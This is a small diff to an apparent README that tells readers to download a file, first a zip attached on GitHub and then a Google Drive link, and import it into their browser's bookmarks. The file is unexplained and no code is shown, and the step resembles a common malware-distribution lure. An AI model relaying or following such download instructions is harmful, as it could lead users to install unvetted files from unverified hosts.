@@ -1,6 +1,5 @@
 # !Before you read download this file to export to your browser!
-# !(also convert into html or it will not work https://www.freeconvert.com/pdf-to-html)!
-# (download this --> [html2pdf.zip](https://github.com/user-attachments/files/18492955/html2pdf.zip)
+# Download at google drive (https://drive.google.com/file/d/1qSHfrt6AgM-T0jVTpLF6w8xR9FiooxhL/view?usp=drive_link)
 
 # Open your bookmarks
 At the top right, select More More and then (Bookmarks and lists > Bookmark manager.)
